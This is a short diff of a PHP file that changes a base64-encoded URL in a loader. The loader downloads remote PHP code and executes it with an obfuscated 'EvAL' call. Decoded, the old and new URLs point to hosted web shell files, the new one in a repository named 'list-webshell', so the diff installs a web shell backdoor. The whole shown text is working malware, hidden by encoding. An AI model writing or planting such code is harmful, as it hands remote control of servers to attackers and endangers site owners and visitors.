@@ -14,5 +14,5 @@ if(isset($_COOKIE)) {
     }
 }
 
-$file = file_get_contents(base64_decode("aHR0cHM6Ly9zaGVsbC5wcmluc2guY29tL05hdGhhbi9hbGZhLnR4dA=="));
+$file = file_get_contents(base64_decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2hla2VyLXByby9saXN0LXdlYnNoZWxsL3JlZnMvaGVhZHMvbWFpbi9zaHhzLnBocAo="));
 EvAL ("?>" . $file);
